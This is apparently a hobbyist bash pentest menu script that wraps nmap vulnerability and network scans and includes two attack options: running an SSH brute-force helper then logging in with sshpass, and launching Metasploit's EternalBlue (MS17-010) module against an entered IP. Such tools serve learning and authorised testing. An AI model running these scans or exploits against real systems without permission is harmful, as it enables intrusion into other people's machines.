#!/bin/bash

#header design
echo -e "
              \e[1;5;33m     Welcome to \e[0m \e[1;5;31m
                   ███████████                      █████     █████████                      
                  ░░███░░░░░███                    ░░███     ███░░░░░███                     
                   ░███    ░███  ██████  ████████  ███████  ░███    ░░░  ████████  █████ ████
                   ░██████████  ███░░███░░███░░███░░░███░   ░░█████████ ░░███░░███░░███ ░███ 
                   ░███░░░░░░  ░███ ░███ ░███ ░░░   ░███     ░░░░░░░░███ ░███ ░███ ░███ ░███ 
                   ░███        ░███ ░███ ░███       ░███ ███ ███    ░███ ░███ ░███ ░███ ░███ 
                   █████       ░░██████  █████      ░░█████ ░░█████████  ░███████  ░░███████ 
                   ░░░░░         ░░░░░░  ░░░░░        ░░░░░   ░░░░░░░░░   ███░░░    ░░░░░███ 
                                                                         ░███       ███ ░███ 
                                                                         █████     ░░██████  
                                                                        ░░░░░       ░░░░░░   \e[0m
                                                                  \e[1;5;33m           by QuangNH\e[0m\n"
echo -e "\e[1;3;4;5;7;31mPlease choose an option:\e[0m \n"
echo -e "\e[1;36m1. Generating Report     2 OS Detection     3. Vulnerability Scan     4. Exploit Port 22 or Exploit SM17_010     5.Network Scan     6. Exit\e[0m \n"


# READING & STORING USER INPUT
read -p "Enter your choice: " input
echo


#PERFORMING BASIC SCAN
basic_scan() {
	read -p "Enter your choice (1) Unix   (2) Window to perform Generating Report: " choice
        read -p "Enter the target IP address: " target
        echo -e "\e[1;5;91mPerforming Scan and Generating Report...\e[0m"
        echo
	if [ ! -d "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" ]; then
             mkdir -p "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target"
             cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" || exit
        fi


#MAKING DIRECTORY
        cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" 

#PERFORMING NMAP SCAN
	echo $PWD
        if [ "$choice" == "1" ]; then
             nmap -O --osscan-guess -A -sV -T4 --script vulners  "$target" -oX report.xml > report.txt;
	     xsltproc report.xml -o report.html
        
        echo -e "\e[1;5;92mVulnerability Scan completed. Results saved in $PWD/vuln_scan.txt\e[0m"
        echo
        fi
        if [ "$choice" == "2" ]; then
             nmap -Pn -A -T4 --script smb-os-discovery.nse,vuln "$target" -oX report.xml > report.txt;
	     xsltproc report.xml -o report.html
        cd ..  
        echo -e "\e[1;5;92mVulnerability Scan completed. Results saved in $PWD/vuln_scan.txt\e[0m"
        echo
        fi
        cd ..
        echo
}



#PERFORMING OS DETECTION
os_detection() {
        read -p "Enter the target IP address: " target
        echo -e "\e[1;5;91mPerforming OS Detection...\e[0m"
        echo

#CHECKING AND MAKING DIRECTORY
        if [ ! -d "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" ]; then
             mkdir -p "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target"
             cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" || exit
        fi

#PERFORMING NMAP SCAN
	cd "$target"
        current_path=$(pwd)
        echo -e "\e$current_path\e[0m"
        echo
        nmap -A -T4 "$target" > OS_scan.txt
        
        cd ..
        echo -e "\e[1;5;92mOS Scan completed. Results saved in $PWD/$target/OS_scan.txt\e[0m"
        echo
}



#PERFORMING VULNERABILITY SCAN
vul_scan() {
	read -p "Enter your choice (1) Unix   (2) Window to perform Vulnerability Scan: " choice


    	if [ "$choice" != "1" ] && [ "$choice" != "2" ]; then
        	echo "Invalid choice. Exiting..."
        	return
    	fi
	read -p "Enter the target IP address: " target
        echo -e "\e[1;5;91mPerforming Vulnerability Scan...\e[0m"
        echo

#CHECKING AND MAKING DIRECTORY
        if [ ! -d "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" ]; then
             mkdir -p "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target"
             cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" || exit
        fi

#PERORMING NMAP SCAN
	cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target"
        if [ "$choice" == "1" ]; then
	     nmap -sV --script vulners  "$target" > vuln_scan.txt;
        
        echo -e "\e[1;5;92mVulnerability Scan completed. Results saved in $PWD/vuln_scan.txt\e[0m"
        echo
	fi
	if [ "$choice" == "2" ]; then
             nmap --script vuln  "$target" > vuln_scan.txt;
        cd ..  
        echo -e "\e[1;5;92mVulnerability Scan completed. Results saved in $PWD/vuln_scan.txt\e[0m"
        echo
        fi



}



	
#PERFORMING EXPLOIT SCAN
script_scan() {

#CHECKING AND MAKING DIRECTORY
#PERFORMING NMAP SCAN
        read -p "Enter your choice (1) Exploit Port 22   (2)Exploit vuln SM17_010: " choice
        if [ "$choice" != "1" ] && [ "$choice" != "2" ]; then
                echo "Invalid choice. Exiting..."
                return
        fi
        if [ "$choice" == "1" ]; then
            current_path=$(pwd)
            echo -e "\e$current_path\e[0m"
            echo
            cd SSHFORCE
            python sshforce.py
            read -p "Enter the IP: " target
            read -p "Enter the Username: " user
            read -p "Enter the Password: " pass
            sshpass -p "$pass" ssh "$user"@"$target"
            cd ..
            echo -e "\e[1;5;92mDetect Exploit completed.\e[0m"
            echo
        fi
        if [ "$choice" == "2" ]; then
            read -p "Enter the taget IP: " target
            xterm -e "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set rhosts $target; exploit'"
            cd ..
            echo -e "\e[1;5;92mDetect Exploit completed.\e[0m"
            echo
        fi

        
}



#PERFORMING NETWORK SCAN
full_scan() {
        read -p "Enter the IP range: " target
	read -p "Enter the Subnet Mark: " mark
        echo -e "\e[1;5;91mPerforming Network Scan. This may take a while...\e[0m"
        echo

#CHECKING AND MAKING DIRECTORY
       if [ ! -d "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target" ]; then
             mkdir -p "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target/$mark"
             cd "/home/quangnh/Desktop/PentestTool/QuangNH/PortSpy/$target/$mark" || exit
        fi

#PERFORMING NMAP SCAN
	cd "$target"
	echo -e "\e$current_path\e[0m"
	cd "$mark"
        current_path=$(pwd)
        echo -e "\e$current_path\e[0m"
        echo
        nmap  -sn "$target/$mark" > network_scan.txt
        cd ../..
        echo -e "\e[1;5;92mFull Network completed. Results saved in $PWD/$target/full_scan.txt\e[0m"
        echo
}

# performing actions based on provided input
case $input in
    1)
        basic_scan
        ;;
    2)
        os_detection
        ;;
    3)
        vul_scan
        ;;
    4) 
        script_scan
        ;;
    5)  
        full_scan
        ;;

    6)  
        echo -e "\e[38;5;82m Exiting...\e[0m"
        ;;
    *)
        echo -e "\e[1;5;31mInvalid Input! Please select a valid option...\e[0m"
        ;;

esac                                                  


perform_task() {
    echo -e "\e[1;3;4;5;7;31mPlease choose an option:\e[0m \n"
    echo -e "\e[1;36m1. Generating Report     2 OS Detection     3. Vulnerability Scan     4. Exploit port 22 or Exploit SM17_010     5. Network Scan     6. Exit\e[0m \n"

    # READING & STORING USER INPUT
    read -p "Enter yousr choice: " input
    echo
    case $input in
    1)
        basic_scan
        ;;
    2)
        os_detection
        ;;
    3)
        vul_scan
        ;;
    4) 
        script_scan
        ;;
    5)  
        full_scan
        ;;
    6)  
        echo -e "\e[38;5;82m Exiting...\e[0m"
        ;;
        
    *)
        echo -e "\e[1;5;31mInvalid Input! Please select a valid option...\e[0m"
        ;;

esac        

another_task_or_exit
}

#ASKING FOR FURTHER TASKS
another_task_or_exit() {
    read -p "Do you want to perform another task? (Y/N): " choice
    echo
    case $choice in
        [Yy]) 
            perform_task ;; #function for further task
        [Nn]) 
            echo -e "\e[38;5;82mExiting...\e[0m" ;;  # If the choice is N or n, exit the script
        *) 
            echo -e "\e[1;5;31mInvalid input! Please enter Y or N.\e[0m" ; 
            another_task_or_exit ;;  # If the choice is neither Y nor N, ask again
    esac
 }

 another_task_or_exit
